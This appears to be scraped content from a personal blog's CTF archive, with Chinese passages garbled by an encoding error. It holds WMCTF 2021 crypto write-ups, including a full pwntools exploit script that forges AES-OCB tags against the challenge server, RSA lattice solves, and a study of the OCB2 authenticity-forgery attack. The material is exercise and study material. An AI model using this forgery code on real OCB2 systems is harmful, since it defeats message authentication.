GWHT{pell_equation_is_very_interesting}\n","date":"12 September 2021","permalink":"/achieve/ctf/%E5%85%BB%E6%88%90%E6%9D%AF2021/","section":"archive","summary":"","title":"å…»æˆæ¯2021"},{"content":"\u0026ndash;\u0026gt;\nBaby_OCB # æƒ³å¤šäº†ï¼Œæ¯”æƒ³è±¡ä¸­ç®€å•ã€‚ã€‚ã€‚\nåŠ å¯†æ¨¡å¼ä¸ºAES.OCBï¼ŒæœåŠ¡å™¨æä¾›åŠ å¯†å’Œè§£å¯†åŠŸèƒ½ï¼Œ\n$D(),E()è¡¨ç¤ºaeså†…éƒ¨çš„aes.encrypt,aes.decrypt$\nGet flagè·å–Aä¸º\nPMAC # æ˜¯ä¸€ç§å¤„ç†authorçš„å‡½æ•°ï¼Œå…¶è¾“å‡ºç»“æœåªä¸å†…éƒ¨ aes å’Œ header å‚æ•°æœ‰å…³\nencrypt # å‰ç½®ï¼š$checksum=\\bigoplus^n_{i=1}m_i$\nAES.OCBåŠ å¯†å‡½æ•°ï¼Œå¯¹äºé™¤å»æœ€åä¸€å—çš„å‰é¢æ‰€æœ‰æ˜æ–‡å—ï¼Œå…¶æ»¡è¶³\n$c_i=2_iâ‹…E(nonce)â¨E(2_iâ‹…E(nonce)â¨m_i)$\nè€Œå¯¹ä¸æœ€åä¸€å—ï¼Œå…¶æ»¡è¶³\n$c_n=m_nâ¨E(2_nâ‹…E(nonce)â¨len(0^n))$\nè€ŒåŠ å¯†æ—¶çš„ tag ä¸å…¶ä»–å‚æ•°ï¼Œæ»¡è¶³\n$tag=E(3\\cdot 2^n\\cdot E(nonce)\\bigoplus checksum)$\ndecrypt # decrypt AES.OCBè§£å¯†å‡½æ•°ï¼Œå¯¹äºé™¤å»æœ€åä¸€å—çš„å‰é¢æ‰€æœ‰æ˜æ–‡å—ï¼Œå…¶æ»¡è¶³\n$m_i=D(c_iâ¨2^iâ‹…E(nonce))â¨2^iâ‹…E(nonce)$\nè€Œå¯¹ä¸æœ€åä¸€å—ï¼Œå…¶æ»¡è¶³\n$m_n=c_nâ¨E(2^nâ‹…E(nonce)â¨len(0^n))$\nè§£å¯†æ—¶çš„ checktag ä¸å…¶ä»–å‚æ•°ï¼Œæ»¡è¶³\n$checksum=\\bigoplus^n_{i=1}m_i$\n$checktag=E(3â‹…2^nâ‹…E(nonce)â¨checksum)$\nåŒæ ·çš„ï¼Œå¦‚æœ header\u0026gt;0\nåˆ™æ–°çš„ $checktag=checktagâ¨header$\nimplement # è¿™é‡Œæˆ‘ä»¬è¿™æ ·æ„é€ \n$m1=len(0n)=15Ã—bâ€²\\x00â€²+bâ€²\\x80â€² m2=0=16Ã—bâ€²\\x00â€²$\né‚£ä¹ˆ m1 ä¼šè¢«å½“ä½œéæœ€åä¸€å—åŠ å¯†\n$c1=2â‹…E(nonce)â¨E(2â‹…E(nonce)â¨m1)$\n$c2=m2â¨E(4â‹…E(nonce)â¨len(0n)) =E(4â‹…E(nonce)â¨len(0n))$\néšåè°ƒç”¨è§£å¯†å‡½æ•°æ—¶åªæäº¤ c1 ï¼Œæ­¤æ—¶ä¼šè¢«å½“ä½œæœ€åä¸€å—è§£å¯†ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¼šå‘ç°\n$m1=c1â¨E(2â‹…E(nonce)â¨m1) =2â‹…E(nonce)â¨E(2â‹…E(nonce)â¨len(0n))â¨E(2â‹…E(nonce)â¨m1)$\nè€Œæˆ‘ä»¬æ„é€ çš„ m1=len(0n) ï¼Œé‚£ä¹ˆæ˜¾ç„¶ m1=2â‹…E(nonce) ï¼Œæ­¤æ—¶ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿè½»æ¾ç®—å‡º $E(nonce)$ ï¼\nä½†å› ä¸ºAES.OCBçš„è®¤è¯ç‰¹æ®Šæ€§ï¼Œæˆ‘ä»¬éœ€è¦ä½¿å¾—ä¼ªé€  tag æ¥é€šè¿‡è®¤è¯æ£€æµ‹ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©ä»¤ header ä¸ºç©ºï¼Œé‚£ä¹ˆæ­¤æ—¶çš„\n$checktag=E(6â‹…E(nonce)â¨2â‹…E(nonce)) =E(4â‹…E(nonce))$\nå¦‚ä½•èƒ½å¾—åˆ°è¿™ä¸ªç©æ„å‘¢ï¼Ÿ\nå½“æˆ‘ä»¬å†æ¬¡ç¨å¾®å˜åŒ–ä¸€ä¸‹ $c1=c1â¨m1$ åï¼Œæˆ‘ä»¬å‘ç°æ­¤æ—¶\n$checktag=E(m1â¨6â‹…E(nonce)â¨2â‹…E(nonce)) =E(m1â¨4â‹…E(nonce))=c2$\nä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ç»™åœ¨çº¿ decrypt å‡½æ•°æä¾›çš„æ•°æ®åˆ†åˆ«ä¸ºï¼š nonce ä¸ºåŠ å¯†æ—¶çš„ nonce ï¼Œ tag ä¸º c2 ï¼Œ c=c1 ï¼Œ header ä¸ºç©ºï¼Œè¿™æ ·å°±èƒ½å¤ŸæˆåŠŸé€šè¿‡å®¢æˆ·ç«¯çš„è®¤è¯æ£€æŸ¥ï¼Œå¹¶ä¸”å¾—åˆ°\n$2â‹…E(nonce) $ï¼Œå¯¹ times2 å‡½æ•°å†™ä¸ªé€†å³å¯æ±‚å¾—$ E(nonce)$\næ­¤æ—¶ï¼Œæˆ‘ä»¬å³å¯å¯¹äºä»»æ„çš„ nonce ï¼Œéƒ½èƒ½å¾—åˆ°å…¶å¯¹åº”çš„ $E(nonce)$ ï¼Œä½†æ˜¯å¯¹äºä»»æ„çš„æ˜æ–‡ m ï¼Œå¹¶ä¸èƒ½è‡ªå¦‚çš„å®Œæˆä»»æ„åŠ å¯†ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç°åœ¨ç›¸å½“äºå·²ç»æœ‰äº† nonce ä¸å…¶å¯¹åº”çš„ E(nonce) ï¼Œå¦‚ä½•æ¥å®Œæˆä»»æ„åŠ å¯†çš„æ•ˆæœå‘¢ï¼Ÿ\nè¿™é‡Œæˆ‘ä»¬ä¸ºäº†ä¾¿äºè§£é‡Šï¼Œæˆ‘ä»¬è®° $L=E(nonce)$ ã€\n$Lâ€²=E(2â‹…Lâ¨m1) $\né‚£ä¹ˆå¯ä»¥è½»æ¾ç®—å¾—\n$Lâ€²=c1â¨2â‹…L $\næˆ‘ä»¬å†æ¬¡ä½¿ç”¨å®¢æˆ·ç«¯çš„ encrypt å‡½æ•°ï¼Œä½†è¿™æ¬¡æˆ‘ä»¬çš„\n$nonce=2â‹…Lâ¨m1 $ï¼Œ\n$m=messageâ¨2â‹…L^â€² $\né‚£ä¹ˆ\n$c=2â‹…Lâ€²â¨E(messageâ¨2â‹…L^â€²â¨2â‹…L^â€²)$ ï¼Œæˆ‘ä»¬å°±èƒ½è½»æ¾ç®—å‡º\n$E(message)=câ¨2â‹…L^â€²$\næˆ‘ä»¬å°†å‰é¢æ‰€æœ‰çš„è¿‡ç¨‹çœ‹ä½œä¸€ä¸ªå‡½æ•°ï¼Œå³ä½¿ç”¨ä¸€ä¸ª nonce åé¢ï¼Œæ¥å¾—åˆ°æˆ‘æƒ³è¦çš„ aes.encrypt(message) ï¼Œé‚£ä¹ˆæ­¤æ—¶æ‰€æœ‰çš„åŠ å¯†è¿‡ç¨‹éƒ½å¯ä»¥åœ¨æœ¬åœ°å®Œæˆï¼Œç›´æ¥åœ¨æœ¬åœ°è®¡ç®—é¢˜ç›®æ‰€éœ€è¦çš„ cipher ä¸ tag ï¼Œç›´æ¥æ‰“ç»™æœåŠ¡å™¨å³å¯\nfrom pwn import * from Crypto.Util.number import * from hashlib import sha256 import string from pwnlib.util.iters import mbruteforce import base64 #context.log_level = \u0026#39;debug\u0026#39; xor = lambda s1 , s2 : bytes([x1^x2 for x1,x2 in zip(s1,s2)]) table = string.ascii_letters+string.digits def times2(input_data,blocksize = 16): assert len(input_data) == blocksize output = bytearray(blocksize) carry = input_data[0] \u0026gt;\u0026gt; 7 for i in range(len(input_data) - 1): output[i] = ((input_data[i] \u0026lt;\u0026lt; 1) | (input_data[i + 1] \u0026gt;\u0026gt; 7)) % 256 output[-1] = ((input_data[-1] \u0026lt;\u0026lt; 1) ^ (carry * 0x87)) % 256 assert len(output) == blocksize return output def times3(input_data): assert len(input_data) == 16 output = times2(input_data) output = xor_block(output, input_data) assert len(output) == 16 return output def back_times2(output_data,blocksize = 16): assert len(output_data) == blocksize input_data = bytearray(blocksize) carry = output_data[-1] \u0026amp; 1 for i in range(len(output_data) - 1,0,-1): input_data[i] = (output_data[i] \u0026gt;\u0026gt; 1) | ((output_data[i-1] % 2) \u0026lt;\u0026lt; 7) input_data[0] = (carry \u0026lt;\u0026lt; 7) | (output_data[0] \u0026gt;\u0026gt; 1) # print(carry) if(carry): input_data[-1] = ((output_data[-1] ^ (carry * 0x87)) \u0026gt;\u0026gt; 1) | ((output_data[-2] % 2) \u0026lt;\u0026lt; 7) assert len(input_data) == blocksize return input_data def xor_block(input1, input2): assert len(input1) == len(input2) output = bytearray() for i in range(len(input1)): output.append(input1[i] ^ input2[i]) return output def hex_to_bytes(input): return bytearray(long_to_bytes(int(input,16))) def pow(): io.recvuntil(b\u0026#34;XXXX+\u0026#34;) suffix = io.recv(16).decode(\u0026#34;utf8\u0026#34;) io.recvuntil(b\u0026#34;== \u0026#34;) cipher = io.recvline().strip().decode(\u0026#34;utf8\u0026#34;) proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() == cipher, table, length=4, method=\u0026#39;fixed\u0026#39;) io.sendline(proof.encode()) def get_FLAG_data(): io.recv() io.sendline(b\u0026#39;3\u0026#39;) io.recvuntil(b\u0026#39;ciphertext: \u0026#39;) ciphertext = base64.b64decode(io.recvline()[:-1]) io.recvuntil(b\u0026#39;tag: \u0026#39;) tag = base64.b64decode(io.recvline()[:-1]) nonce = b\u0026#39;\\x00\u0026#39;*16 associate_data = b\u0026#39;from admin\u0026#39; return ciphertext,tag,nonce,associate_data def Server_Enc(msg,nonce): io.recv() io.sendline(b\u0026#39;1\u0026#39;) io.recv() io.sendline(base64.b64encode(nonce)) io.recv() io.sendline(base64.b64encode(msg)) associate_data = b\u0026#39;from baby\u0026#39; io.recvuntil(b\u0026#39;ciphertext: \u0026#39;) ciphertext = base64.b64decode(io.recvline()[:-1]) io.recvuntil(b\u0026#39;tag: \u0026#39;) tag = base64.b64decode(io.recvline()[:-1]) return ciphertext,tag def Server_Dec(nonce,cip,tag,associate_data): io.recv() io.sendline(b\u0026#39;2\u0026#39;) io.recv() io.sendline(base64.b64encode(nonce)) io.recv() io.sendline(base64.b64encode(cip)) io.recv() io.sendline(base64.b64encode(tag)) io.recv() io.sendline(base64.b64encode(associate_data)) io.recvuntil(b\u0026#39;plaintext: \u0026#39;) plaintext = base64.b64decode(io.recvline()[:-1]) return plaintext def get_my_enc(msg): nonce = bytearray(os.urandom(16)) fake_m = bytearray(b\u0026#39;\\x00\u0026#39;*15+b\u0026#39;\\x80\u0026#39;+b\u0026#39;\\x00\u0026#39;*16) cip,tag = Server_Enc(fake_m,nonce) m0 = bytearray(b\u0026#39;\\x00\u0026#39;*15+b\u0026#39;\\x80\u0026#39;) m1 = bytearray(b\u0026#39;\\x00\u0026#39;*16) c0 = cip[:16] c1 = cip[16:] enc = xor_block(Server_Dec(nonce,xor_block(c0,m0),c1,b\u0026#34;\u0026#34;),m0) A = back_times2(enc) B = enc C = xor_block(B,c0) msg = msg new_nonce = xor_block(B,m0) new_msg = xor_block(msg,times2(C)) + m1 new_msg = (bytes(new_msg)) ENC,TAG = Server_Enc(new_msg,new_nonce) #io.interactive() return xor_block(ENC[:16],times2(C)) def my_pmac(header, blocksize = 16): assert len(header) m = int(max(1, math.ceil(len(header) / float(blocksize)))) offset = get_my_enc(bytearray([0] * blocksize)) offset = times3(offset) offset = times3(offset) checksum = bytearray(blocksize) for i in range(m - 1): offset = times2(offset) H_i = header[(i * blocksize):(i * blocksize) + blocksize] assert len(H_i) == blocksize xoffset = xor_block(H_i, offset) encrypted = get_my_enc(xoffset) checksum = xor_block(checksum, encrypted) offset = times2(offset) H_m = header[((m - 1) * blocksize):] print(H_m) assert len(H_m) \u0026lt;= blocksize if len(H_m) == blocksize: offset = times3(offset) checksum = xor_block(checksum, H_m) else: H_m = H_m + b\u0026#39;\\x80\u0026#39; while len(H_m) \u0026lt; blocksize: H_m += b\u0026#39;\\x00\u0026#39; assert len(H_m) == blocksize checksum = xor_block(checksum, H_m) offset = times3(offset) offset = times3(offset) final_xor = xor_block(offset, checksum) auth = get_my_enc(final_xor) return auth if __name__ == \u0026#34;__main__\u0026#34;: # io = remote(\u0026#34;47.104.243.99\u0026#34;,10001) io = remote(\u0026#34;0.0.0.0\u0026#34;,10002) pow() F_ciphertext,F_tag,F_nonce,F_associate_data = get_FLAG_data() print(len(F_ciphertext)) FROMADMIN = my_pmac(b\u0026#39;from admin\u0026#39;) print(FROMADMIN) FROMBABY = my_pmac(b\u0026#39;from baby\u0026#39;) print(FROMBABY) F_associate_data = b\u0026#39;from baby\u0026#39; F_tag = xor_block(xor_block(F_tag, FROMADMIN),FROMBABY) print(Server_Dec(F_nonce,F_ciphertext,F_tag,F_associate_data)) io.interactive() åŒç±»å‹\næ´¥é—¨è¢« çº¢æ˜è°· babyFogery ezlsb # analysis # æ ¸å¿ƒç‚¹æ˜¯æ‰¾åˆ°passwdè®¿é—®Backdoorï¼Œ\nå†è®¿é—®Leakç»™ä½  p,e,flag_enc çº¦ç­‰äºgetflagäº†\nMain:\n$$ \\begin{aligned} a=getPrime(512) \\\\ p =a^2+sx_1+2k_1+1\\\\ q = b^2 + sx_2+2k_2+1\\\\ n=pq\\\\ e=65537\\\\ pass_enc = pass^e\\mod n\\\\ \\end{aligned} $$\nğŸ‘´æ¨åˆ°è¿™é‡Œå°±å¯„äº†\nlookback # ä¸»è¦ä»»åŠ¡ï¼š4 æ¬¡ Airdrop çš„æœºä¼š åˆ†è§£ n,å¯ä»¥å°†nå’Œgitfså†™ä¸ºä¸€ä¸ªåŠ å¼ºç‰ˆAGCDé—®é¢˜\n$$ \\begin{aligned} gift_1 =q_1a^2+q_1r_1\\\\ gift_2 =q_2a^2+q_2r_2\\\\ gift_3 =q_3a^2+q_3r_3\\\\ gift_4 =q_4a^2+q_4r_4 \\end{aligned} $$\n$n=qa^2+qr$\nå¯¹nå’Œgiftså¼€æ–¹å¯ä»¥å¾—åˆ°AGCDçš„é€‚ç”¨çš„æ¡ä»¶èŒƒå›´\nç”¨æ ¼å­è§„çº¦ä¸€ä¸‹å¯ä»¥å¾—åˆ°açš„å€¼\nç„¶åç”¨copper coä¸€ä¸‹å°±æ‹¿åˆ°pqäº†\nç„¶åè§£å‡ºpasswdå»æ‹¿leak\nsolve # from Crypto.Util.number import * n = 47935439323457127833037357083983237496878689261127081988649381912739468031720632155196797632254382181519984640185516509133478757768213513987941266551218952702606511178276633908546681835137035411034761316782876147359960487121213984853077540707588650724919247893999205747065241005931759522778403309142776013266993947909627871209547322186129461944966954255478452004126991923307040855781751576009560486080068518925411003611155913186594087392942825850544717133800805624006483035224985413873703244911627183839595554490748948155205230203576672211733145725061218786720271669259766573150046403742640731305478008090581342450251 c = 3919344937892382453030977567508693676032303846339768189327551099374946365060960690768609451174592443590215485748150561581950399880588830921746078740240411900651523182948715415984890388869890625266181130509341855855926592096861408547012789662424413990132921065901887989126066338526922430576216968899218768929718135909294604392991675565238263427980279809833873727879908414057057251514599614783087363407160259495649433827508201133578753184878878951808963235285802411560617758684149245785926009513999665737813112781227632184408328506347530201548662504337685327938279816153782173263392272482010848912768570644687383402740 e = 0x10001 import gmpy2 gift = [n,44990368188010733918858560274483758890181415269493297111432503547349003225605998615045785893226033910128870030617267155471810954946701223520640922021975809987807505611903409246795611631098996240773157768116757200113829094343552868816290020352831816362796203792491207823175523672191727528508633850619433949770456610363882692306556232795718586073455551690290817146381615597057233415356702398751201147360489923331479498200944380380485186742204102241268627281885440725091810845139220728878887230186802227055200861696153582625239928130166788950797548542788617056657074111819043054568673588056230147076007178129781162831611, 78683096763326373669536693596249569085095290247102968419967840631586829732977219369969300751984289814402998022338838702200385790818392667580904195251832143834204909181557079203022588554330880322720341355019524178584242950915453525665150758590809948785874945747350388081180350115247240154475291948408741761648481087095447887536869026145459137082976669264740463624475908502268200243221926503732189641142315206390638626198685135408561463549566690400552904111413732721731304453362155831880117750312809828284867777234323889613356325170410656020466019958496069321445323099847122674429896323552643458809760407340317926830901, 155378045723411522600696035951116955917841229585849918356678240504530602921920566960136486129553454017727749961462685165377347755302826839915112915642536853507763599097574159709699129520153090998679336513853206496584404340204651266745291554668873684828162763771988162464321539837322058407795741726134977433737336303715635638805865795180826546489644742166424956313290523391862752963123672824271036686045932898668866001588000885565313392223064341062105415322004215058987783863547389257154167383707353247208122517429835580960973747381235079792989510459208038145580319784674535377716228024727145018179341727746440515438603, 145996826337300053358889785500361366816465399568166384938579711772423913668332754495063912415488340254571832698805395656780786821255846897561093531075917438583833034671829076937376980928330090827535202591154261056743308762095398623323354628401868490174767786058940272278982366625466222310654778128867887749716594188776848527274133080300896292575037380431855075174589507467705421620952488239054607980417485378752030675364661643727200369011640293898438494036260460375174641137939853447480714174584002881316581265441151705735968822426191526020807499157273552559963397713746419094028547071420597530907758157846952075538021] G = [] for i in gift: G.append(gmpy2.iroot(i,2)[0]) from sage.all import * M = Matrix(ZZ,4+1,4+1) for i in range(4): M[i+1,i+1] = -G[0] for i in range(4): M[0,i+1] = G[i+1] M[0,0] = 2** (368) P=M.LLL()[0] P0 = (abs(P[0])//M[0,0]) Q = [P0] #print((bin(P0))) for i in range(1,5): tmp = ((P[i]-P0*G[i])//G[0]) Q.append(tmp) import gmpy2 a = abs(G[0]//Q[0]) print(a) \u0026#39;\u0026#39;\u0026#39; N = 47935439323457127833037357083983237496878689261127081988649381912739468031720632155196797632254382181519984640185516509133478757768213513987941266551218952702606511178276633908546681835137035411034761316782876147359960487121213984853077540707588650724919247893999205747065241005931759522778403309142776013266993947909627871209547322186129461944966954255478452004126991923307040855781751576009560486080068518925411003611155913186594087392942825850544717133800805624006483035224985413873703244911627183839595554490748948155205230203576672211733145725061218786720271669259766573150046403742640731305478008090581342450251 pbar = 15606058170269190953682935674386408585241503399431015536676436247560293934016890029594865561178385431706188686337043777633715364517948170845087640826845217 ZmodN = Zmod(N) P.\u0026lt;x\u0026gt; = PolynomialRing(ZmodN) f = pbar**2 + x x0 = f.small_roots(X=2^368, beta=0.1,epsilon = 0.01) p = pbar + x0[0] print(\u0026#34;p: \u0026#34;, p) 243549051613825768264099803511229671296850562269513049496935511304072171908221622373325530141385783545202972578556352456412692718100967837804917914686772005951461971082613057233161910519390099300130916541889963526259281974154202935031489884213351283127857066122909931059096582655197258061167540446985751813009 \u0026#39;\u0026#39;\u0026#39; p = 243549051613825768264099803511229671296850562269513049496935511304072171908221622373325530141385783545202972578556352456412692718100967837804917914686772005951461971082613057233161910519390099300130916541889963526259281974154202935031489884213351283127857066122909931059096582655197258061167540446985751813009 q = 47935439323457127833037357083983237496878689261127081988649381912739468031720632155196797632254382181519984640185516509133478757768213513987941266551218952702606511178276633908546681835137035411034761316782876147359960487121213984853077540707588650724919247893999205747065241005931759522778403309142776013266993947909627871209547322186129461944966954255478452004126991923307040855781751576009560486080068518925411003611155913186594087392942825850544717133800805624006483035224985413873703244911627183839595554490748948155205230203576672211733145725061218786720271669259766573150046403742640731305478008090581342450251//p phi = (p-1)*(q-1) d = inverse(0x10001,phi) print(long_to_bytes(pow(c,d,47935439323457127833037357083983237496878689261127081988649381912739468031720632155196797632254382181519984640185516509133478757768213513987941266551218952702606511178276633908546681835137035411034761316782876147359960487121213984853077540707588650724919247893999205747065241005931759522778403309142776013266993947909627871209547322186129461944966954255478452004126991923307040855781751576009560486080068518925411003611155913186594087392942825850544717133800805624006483035224985413873703244911627183839595554490748948155205230203576672211733145725061218786720271669259766573150046403742640731305478008090581342450251))) c = 26477776136511814537867182410042935036751631193394882824790793880743251563906439761929648379057880893788211246254847830996292172157860942596330440504204415170090503913269874666809421512135396019520075970999555199447275211351781765139220570319976413703772788491129400862990098026864762589440254742120432827191 n = 462759013310826480654170350879608056333317185952185294792509715751354925534996431275210016348827150025558626490699228055937593844557693779418456113065581193070896452111537933875515496157080452283253231904539734791991415148758529596162008849892665895353050001859515122987866725231231752910748407229540350263791 c1 = pow(c,inverse(4096,n-1),n) c2 = pow(c1,(n+1)//4,n) print(long_to_bytes(n-c2)) Attachment # WMCTF2021 ","date":"31 August 2021","permalink":"/achieve/ctf/wmctf2021/","section":"archive","summary":"","title":"WMCTF 2021"},{"content":"\rA study of Cryptanalysis of OCB2 # Introduction (TL;DR) # Authenticated encryption (AE) is a term used to describe encryption systems that simultaneously protect confidentiality and authenticity (integrity) of communications; that is, AE provides both message encryption and message authentication of a plaintext block or message .\nThe offset codebook block cipher mode (OCB)\nOCB provide an extremely efficient algorithm, equal to or more efficient than other AE algorithms. OCB is a cipher mode and we can apply ocb to AES/DES/SM4 etc.\nThe following paragraph briefly introduces OCB1 and OCB2\nOCB1 # Figure 1 shows the overall structure for OCB encryption and authentication.\nThe message M to be encrypted and authenticated is divided into n-bit blocks, with the exception of the last block, which may be less than n bits. Typically, n = 128.\nenc\nInput:$(N,M)$\nOutput:$(C,T)$\nThe calculation of the Z[i] is somewhat complex and is summarized in the following equations\nThe operator Â· refers to multiplication over the finite field $GF(2^{128})$with the irreducible polynomial $m(x) = x^{128} + x^7 + x^2 + 1 $.\nThe operator ntz(i) denotes the number of trailing (least significant) zeros in i\nThe meanings of other notation are as follows\n$checksum = M[1] \\oplus M[2] \u0026hellip;\\oplus Y[m]\\oplus C[m]||0*$\n$tag = first \\; \\tau \\; bits \\; of \\; E_K(checksum\\oplus Z[m])$\nThe following figure summarizes the OCB algorithms for encryption and decryption\nOCB2 # We denote with $msb_c(X)$ and $lsb_c(X)$ the first and last c â‰¤ |X| bits of X respectively.\nThe modeâ€™s key space K is that of the underlying blockcipher E\nthe latter is required to have block length n = 128 (in particular, AES is suitable)\nthe nonce space is $N = {0, 1}^n$\nthe message space $M$ and the AD space A are the set {0, 1} of strings of arbitrary length\n$\\sum means \\; checksum \\; in \\; OCB2$\n$\\epsilon$ means empty\nn $len(X)$ denotes an n-bit encoding of |X|,\n$D_E(N,A,C,T)$ decrypt the C and use M to recalculate $\\sum$\nso, T is related with A and M\nThe main case is the $2^mL$ generation\nBasic Attacks (Minimal Forgery Attack) # We give the minimal example of against OCB2.\nThe rests are in the attachment\nEncrypt $(N, A, M)$ where $N$is any nonce, $A = \\epsilon $ is empty, and $M$ is the 2n-bit message\n$M = M[1]||M[2]$ where\nThe encryption oracle returns a pair $(C, T) $consisting of a 2n-bit ciphertext $C = C[1] || C[2]$ and a tag $T$.\nconstructing parameters are as follows :\nlenth of $C\u0026rsquo;$ is n,the half of $M$\nDecrypt $(N\u0026rsquo; , A\u0026rsquo; , C\u0026rsquo; , T\u0026rsquo; ) $\npseudocode:\nM[0] (in hex) = 00000000000000000000000000000080\rM[1] (in hex) = 0053cc74d9fba8588190c414aff6e6a2\rC, T = encrypt(N, M)\rC_ = C[0] ^ M[0]\rT_ = M[1] ^ C[1]\rauth, M_ = decrypt(N, C_, T_) prove # In this poc $T\u0026rsquo;$ decryptde as pad\nas the $A$ is emptyï¼Œthis breaks the authenticity of OCB2.\nexercise case # Oil Circuit Breaker: https://ctftime.org/task/10227\noops2: https://ctftime.org/task/7217\nReferences # Plaintext Recovery Attack of OCB2,2018\nCryptanalysis of OCB2,2018\nCryptanalysis of OCB2:Attacks on Authenticity and Confidentiality,2019/311\nOCB2-POC\nAttachmant # Download ","date":"29 August 2021","permalink":"/articles/ocb2/","section":"Projects","summary":"","title":"A simple study of OCB2"},{"content":"\rWriteUp for crypto in ç¿”äº‘ber 2021 # ğŸ‘´ç¬¬äºŒæ¬¡æ‰“ç¥¥äº‘æ¯ï¼Œå‘¨æ—¥æ¥è‹Ÿäº†å‡ ä¸ªæ°´é¢˜\nRandom_RSA # æŠŠä»£ç åè¿‡æ¥å†™å°±å®Œäº‹äº†\nä½†æ˜¯è¦æ³¨æ„é¢˜ç›®random.seedæ˜¯åœ¨python2ç¯å¢ƒä¸‹ç®—å‡ºçš„æ•°æ®ã€‚ã€‚ã€‚ã€‚æœ‰ç‚¹å‘äº†\nfrom Crypto.Util.number import * import random seeds = [4827, 9522, 552, 880, 7467, 7742, 9425, 4803, 6146, 4366, 1126, 4707, 1138, 2367, 1081, 5577, 4592, 5897, 4565, 2012, 2700, 1331, 9638, 7741, 50, 824, 8321, 7411, 6145, 1271, 7637, 5481, 8474, 2085, 2421, 590, 7733, 9427, 3278, 5361, 1284, 2280, 7001, 8573, 5494, 7431, 2765, 827, 102, 1419, 6528, 735, 5653, 109, 4158, 5877, 5975, 1527, 3027, 9776, 5263, 5211, 1293, 5976, 7759, 3268, 1893, 6546, 4684, 419, 8334, 7621, 1649, 6840, 2975, 8605, 5714, 2709, 1109, 358, 2858, 6868, 2442, 8431, 8316, 5446, 9356, 2817, 2941, 3177, 7388, 4149, 4634, 4316, 5377, 4327, 1774, 6613, 5728, 1751, 8478, 3132, 4680, 3308, 9769, 8341, 1627, 3501, 1046, 2609, 7190, 5706, 3627, 8867, 2458, 607, 642, 5436, 6355, 6326, 1481, 9887, 205, 5511, 537, 8576, 6376, 3619, 6609, 8473, 2139, 3889, 1309, 9878, 2182, 8572, 9275, 5235, 6989, 6592, 4618, 7883, 5702, 3999, 925, 2419, 7838, 3073, 488, 21, 3280, 9915, 3672, 579] res = [55, 5, 183, 192, 103, 32, 211, 116, 102, 120, 118, 54, 120, 145, 185, 254, 77, 144, 70, 54, 193, 73, 64, 0, 79, 244, 190, 23, 215, 187, 53, 176, 27, 138, 42, 89, 158, 254, 159, 133, 78, 11, 155, 163, 145, 248, 14, 179, 23, 226, 220, 201, 5, 71, 241, 195, 75, 191, 237, 108, 141, 141, 185, 76, 7, 113, 191, 48, 135, 139, 100, 83, 212, 242, 21, 143, 255, 164, 146, 119, 173, 255, 140, 193, 173, 2, 224, 205, 68, 10, 77, 180, 24, 23, 196, 205, 108, 28, 243, 80, 140, 4, 98, 76, 217, 70, 208, 202, 78, 177, 124, 10, 168, 165, 223, 105, 157, 152, 48, 152, 51, 133, 190, 202, 136, 204, 44, 33, 58, 4, 196, 219, 71, 150, 68, 162, 175, 218, 173, 19, 201, 100, 100, 85, 201, 24, 59, 186, 46, 130, 147, 219, 22, 81] ans = [] for i in range(0, 154): random.seed(seeds[i]) rands = [] for j in range(0,4): rands.append(random.randint(0,255)) print(rands) ans.append(res[i] ^ rands[i%4]) print(ans) # print(bytes(ans)) ans = [53, 51, 55, 50, 48, 48, 55, 52, 50, 54, 49, 54, 49, 49, 57, 54, 49, 53, 52, 52, 48, 53, 54, 52, 48, 53, 48, 52, 49, 49, 48, 55, 51, 54, 54, 53, 57, 49, 57, 48, 49, 56, 51, 49, 57, 52, 48, 53, 50, 57, 54, 54, 55, 50, 51, 48, 55, 54, 48, 52, 49, 50, 54, 54, 54, 49, 48, 56, 57, 51, 49, 53, 56, 54, 55, 56, 48, 57, 50, 56, 52, 53, 52, 53, 48, 50, 51, 50, 53, 48, 56, 55, 57, 51, 50, 55, 57, 53, 56, 53, 49, 54, 51, 51, 48, 52, 57, 49, 56, 56, 48, 55, 54, 53, 54, 57, 52, 54, 49, 52, 55, 53, 55, 53, 50, 56, 48, 48, 54, 51, 50, 48, 56, 49, 54, 56, 56, 49, 54, 52, 53, 55, 51, 52, 54, 55, 53, 53, 50, 50, 55, 48, 53, 55] print(bytes(ans)) # 5372007426161196154405640504110736659190183194052966723076041266610893158678092845450232508793279585163304918807656946147575280063208168816457346755227057 ç„¶åå¸¸è§„è§£æ³„éœ²dpçš„rsa\ne = 65537 n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113 dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657 c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751 import gmpy2 from Crypto.Util.number import * dp = 5372007426161196154405640504110736659190183194052966723076041266610893158678092845450232508793279585163304918807656946147575280063208168816457346755227057 e=0x10001 n=81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391 c=61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151 for i in range(1,65538): if (dp*e-1)%i == 0: if n%(((dp*e-1)//i)+1)==0: p=((dp*e-1)//i)+1 q=n//(((dp*e-1)//i)+1) phi = (p-1)*(q-1) d = gmpy2.invert(e,phi)%phi print(long_to_bytes(pow(c,d,n))) # flag{74281db3-c6f0-e59a-4da6-39b8c71250fe} guess # è¿™ä¸ªé¢˜å¦¥å¦¥çš„è¢«æ‰¾åˆ°éé¢„æœŸäº†ã€‚ã€‚ã€‚ã€‚\nAnalysis and implement # è¿™ä¸ªåœ°æ–¹æ˜¯éé¢„æœŸçš„æ ¸å¿ƒè¿™é‡Œä¼šéšæœºé€‰å–ä¸€ä¸ªkeyé™„åŠ 